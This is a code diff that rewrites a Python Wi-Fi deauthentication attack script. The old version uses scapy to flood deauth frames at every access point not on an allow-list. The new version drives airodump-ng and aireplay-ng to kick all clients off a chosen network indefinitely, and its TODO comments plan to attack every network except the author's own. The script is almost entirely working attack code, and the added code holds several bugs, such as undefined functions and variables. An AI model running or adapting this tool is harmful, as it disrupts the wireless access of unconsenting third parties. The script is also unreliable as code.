@@ -1,96 +1,230 @@
-import logging
+#!/usr/bin/python3
+#!/usr/bin/env python3
+
 import csv
-import time
-import subprocess
 import os
+import re
+import shutil
+import subprocess
+import threading
+import time
 
-from threading import Thread, Lock
-from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+from datetime import datetime
 
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+# make sure user pipruns with sudo
+def check_sudo():
+    if not "SUDO_UID" in os.environ.keys():
+        print("(-) Run with sudo")
+        exit()
 
-deauth_counter = 0
-csv_lock = Lock()
+# Moves all csv files in the directory to a new backup location
+def create_backup():
+    for file in os.listdir():
+        if ".csv" in file:
+            print("Found .csv files in directory")
+            directory = os.getcwd()
+            try:
+                # make a backup directory
+                os.mkdir(directory + "/backup/")
+            except:
+                print("Already exists")
+            # Create a timestamp
+            timestamp = datetime.now()
+            # copy .csv files in directory to the backup location
+            shutil.move(file, directory + "/backup/" + str(timestamp) + "-" + file)
 
-def deauth(t_mac, bssid, iface, ch, count=1):
-    global deauth_counter
-    subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)])
+# find the network interfaces
+def get_nic():
+    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
+    nic = wlan_code.findall(result)
+    return nic
+
+def get_clients(bssid, channel, wifi_name):
+    subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout==subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    frame = RadioTap() / Dot11(addr1=t_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=1)
+# set nic to monitor mode
+def set_monitor_mode(con_name):
+    # take WiFi controller down
+    subprocess.run(["ip", "link", "set", wifi_name, "down"]) 
+    # kills conflicting processes
+    subprocess.run(["airmon-ng", "check", "kill"])
+    # set nic to monitor mode
+    subprocess.run(["iw", wifi_name, "set", "monitor", "none"])
+    # bring WiFi controller back online
+    subprocess.run(["ip", "link", "set", wifi_name, "up"])
+
+# change from monitor mode to managed mode
+def set_managed_mode(wifi_name):
+    # take WiFi controller down
+    subprocess.run(["ip", "link", "set", wifi_name, "down"]) 
+    # set nic to monitor mode
+    subprocess.run(["iw", wifi_name, "set", "managed", "none"])
+    # bring WiFi controller back online
+    subprocess.run(["ip", "link", "set", wifi_name, "up"])
+    # start network manager service
+    subprocess.run(["service", "NetworkManager", "start"])
+
+# set monitor band
+def start_monitor():
+    # Checks 2.4Ghz and 5Ghz bands
+    subprocess.run(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+# checks if there is an ESSID in the list
+def check_for_essid(essid, lst):
+    status = True
+
+    # if no ESSIDs in list add the row
+    if len(lst) == 0:
+        return status
     
-    print(f"\nSending packet to {t_mac} on channel {ch}")
-
-    sendp(frame, iface=iface, count=count, inter=0.1, verbose=True)
+    # only runs if there are WAPs in the list
+    for item in lst:
+        # True = don't add to list, False = add to list
+        if essid in item["ESSID"]:
+            status = False
     
-    deauth_counter += count
+    return status
 
-def check_csv(csv_path, allowed_APs):
-    global deauth_counter
+def show_WAPs():
+    active_wireless_networks= list()
+    try:
+        while True:
+            # clear screen
+            subprocess.call("clear", shell=True)
+            for file in os.listdir():
+                # should only have one csv file, rest should be in backup location
+                # following list contains the field names for the csv entries
+                fieldnames = ('BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key')
+                if ".csv" in file:
+                    with open(file) as csv_h:
+                        # use DictReader method take csv_h contents and apply the dict with the fieldnames
+                        # creates a list of dictionaries with the keys as specified in the fieldnames
+                        csv_h.seek(0)
+                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                        for r in csv_reader:
+                            if r["BSSID"] == "BSSID":
+                                pass
+                            elif r["BSSID"] == "Station MAC":
+                                break
+                            elif check_for_essid(essid=r["ESSID"], lst=active_wireless_networks):
+                                active_wireless_networks.append(r)
+            print("Scanning... Press Ctrl+C to select which wireless network to attack\n")
+            print("No |\tBSSID          |\tChannel|\tESSID              |")
+            print("___|\t_______________|\t_______|\t___________________|")
+            for index, item in enumerate(active_wireless_networks):
+                print(f"{index}\t{item['BSSID']}\t{item['Channel'].strip()}\t\t{item['ESSID']}")
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n(-) Ready to make choice...")
 
-    with csv_lock:
-        with open(csv_path, 'r') as csvfile:
-            reader = csv.DictReader(csvfile)
-            for r in reader:
-                keys = ['BSSID', 'ESSID', 'channel']
+    while True:
+        choice = input("Select a choice from above: ")
+        if active_wireless_networks[int(choice)]:
+            return active_wireless_networks[int(choice)]
+        print("(-) Invalid, try again...")
 
-                if all(key in r for key in keys):
-                    t_mac = r['BSSID']
-                    bssid = r['BSSID']
-                    essid = r['ESSID']
-       
-                    if essid not in allowed_APs:
-                      deauth(t_mac=t_mac, bssid=bssid, iface="wlan1", ch=int(r['channel']), count=5)
-    return deauth_counter
+# TODO change this to attack networks not related to WapitiWifi, WapitiLab, Wapiti2000, Wapiti3004 etc.
+def deauth(netw_mac, targ_mac, interface):
+    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", netw_mac, "-c", targ_mac, interface])
 
-def run_airodump(t, ch, allowed_APs):
-    process = subprocess.Popen(["airodump-ng", "--output-format", "kismet", "--write", "output", "--channel", str(ch), "--write-interval", "1", "wlan1"])
+# regex stuff
+macAddr_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
+wlan = re.compile("Interface (wlan[0-9]+)")
 
-    time.sleep(t)
+# check for sudo and create backup
+check_sudo()
+create_backup()
 
-    process.terminate()
-    
-    merge_csv_files()
+# mac addresses to leave alone
+safe_macAddr = list()
 
-    deauth_counter = check_csv(csv_path="merged-scan.csv", allowed_APs=allowed_APs)
-    
+while True:
+    #TODO change this to open a csv file and append to list
+    print("Enter the MAC Address(es) of the devices you don't want to kick off the network")
+    macs = input("comma seperated list if more than one, ie 00:11:22:33:44:55,11:22:33:44:55:66 : ")
 
-def merge_csv_files():
-    files = [f for f in os.listdir() if f.startswith("output-") and f.endswith(".csv")]
-    if files:
-        files.sort(key=lambda x: int(x.split('-')[1].split('.')[0]))
 
-        with open("merged-scan.csv", 'w', newline='') as output_csv:
-            csv_writer = csv.writer(output_csv)
+    safe_macAddr = macAddr_regex.findall(macs)
+    safe_macAddr = [mac.upper() for mac in safe_macAddr]
 
-            with open(files[0], 'r') as first_file:
-                csv_reader = csv.reader(first_file)
-                header = next(csv_reader)
-                csv_writer.writerow(header)
+    if len(safe_macAddr) > 0:
+        break
 
-            for file in files:
-                with open(file, 'r') as current_file:
-                    csv_reader = csv.reader(current_file)
-                    next(csv_reader)
-                    csv_writer.writerows(csv_reader)
+    print("(-) Invalid Mac Address(es)")
 
-       # for file in files:
-       #     os.remove(file)
-    
+netw_con = find_nic()
+if len(netw_con) == 0:
+    print("(-) conect a NIC and try again...")
+    exit()
 
-def threading_func(ch_list, allowed_APs, t):
+while True:
+    for index, con in enumerate(netw_con):
+        print(f"{index} - {con}")
 
-    threads = []
-    for ch in ch_list:
-        thread = Thread(target=run_airodump, args=(t, ch, allowed_APs))
-        threads.append(thread)
-        thread.start()
-    	
-    for thread in threads:
-    	thread.join()
-    	    
-    
-t = 10
-allowed_APs = ["Wapiti2000"] # add Wapiti3004, WapitiWifi, Wapiti77 back
-#ch_list = list(range(1,15)) + [36,40,44,48,52,56,60,64,100,104,108,112,116,132,136,140,144,149,153,157,161,165]
-ch_list = [1,6,11,36,40,44,48,149,153,157,161]
-threading_func(ch_list=ch_list, allowed_APs=allowed_APs, t=t)
+    con_choice = input("Select the controller you want to put into monitor mode: ")
+
+    try:
+        if netw_con[int(con_choice)]:
+            break
+    except:
+        print("(-) Invalid selection...")
+
+# Assign NIC name to a variable
+wifi_name = netw_con[int(con_choice)]
+
+#set NIC to monitor mode
+set_monitor_mode(con_name=wifi_name)
+# Monitor 2.4Ghz & 5Ghz
+start_monitor()
+
+# TODO instead of picking a network choice, we should automate it to attack everything besides our networks.
+""""""
+# Print menu
+wifi_netw_choice = show_WAPs()
+bssid = wifi_netw_choice["BSSID"]
+# strip out all extra white space
+channel = wifi_netw_choice["channel"].strip()
+# run only against network we want to kick clients off
+get_clients(bssid=bssid, channel=channel, wifi_name=wifi_name)
+""""""
+
+# set can only hold unique values
+active_clients = set()
+# keep track of threads
+threads = []
+
+subprocess.run(["airmon-ng", "start", wifi_name, channel])
+try:
+    while True:
+        count = 0
+
+        # clear screen
+        subprocess.call("clear", shell=True)
+        for file in os.listdir():
+            fieldnames = ("Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs")
+            if ".csv" in file and file.startswith("clients"):
+                with open(file) as csv_h:
+                    print("Running...")
+                    csv_h.seek(0)
+                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                    for index, r in enumerate(csv_reader):
+                        if index < 5:
+                            pass
+                        # won't add MAC address(es) we specified at the beginning
+                        elif r["Station MAC"] in safe_macAddr:
+                            pass
+                        else:
+                            # add all the active MAC addresses
+                            active_clients.add(r["Station MAC"])
+            print("Station MAC          |")
+            print("_____________________|")
+            for item in active_clients:
+                print(f"{item}")
+                if item not in threads:
+                    theads.append(item)
+                    t = threading.Thread(target=deauth, args=[bssid, item, wifi_name], daemon=True)
+                    t.start()
+except KeyboardInterrupt:
+    print("\nStopping Deauth...")
+
+set_managed_mode(wifi_name)
